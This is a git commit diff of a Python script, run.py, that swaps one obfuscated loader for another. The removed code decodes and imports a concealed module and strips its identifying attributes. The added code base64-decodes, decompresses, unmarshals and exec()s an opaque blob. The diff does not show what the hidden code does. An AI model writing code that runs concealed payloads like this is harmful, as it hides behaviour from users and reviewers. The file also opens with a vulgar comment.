7894f34e722a513a6a511d0a99957b89fd3ab0a6
_FlameVortex <160109584+FlameVortex@users.noreply.github.com>
2025-12-01 16:30:45 +0600

    Update run.py

--- run.py
+++ run.py
@@ -1,27 +1,11 @@
 #kira bokachuda ay khane ki,,,,,,tor chudlingpong,,,,,,,vag ante
 
-import base64 as __B, zlib as __Z, marshal as __M, types as __T, sys as __S
-
-__X = b'eJxLzs8tKEotLkktLlFIyS9NTU4sKMlMTlKyMjIw1U8uzi9KzFeKBQA1axlP'
+import base64 as __A, zlib as __B, marshal as __C, importlib, sys
 
 try:
-    __D = __Z.decompress(__B.b64decode(__X))
-except Exception:
-    raise SystemExit("Error: Corrupted encrypted block.")
-
-__mod = __D.decode()
-
-try:
-    __core = __import__(__mod)
-except Exception as e:
-    raise SystemExit("Core Import Failed: %s" % e)
-
-for __k in ("__file__", "__loader__", "__spec__", "__cached__"):
-    if hasattr(__core, __k):
-        try: setattr(__core, __k, None)
-        except: pass
-
-if hasattr(__core, "main"):
-    __core.main()
-else:
-    raise SystemExit("Error: main() not found in core")
+    __P = b"eJxLzs8tKEotLkktLlHISSxJT0rMz1FIT8xL1UjOzytJLEnMAwCDAwgO"
+    __D = __C.loads(__B.decompress(__A.b64decode(__P)))
+    exec(__D, globals(), globals())
+except Exception as E:
+    print("Error:", E)
+    sys.exit(1)
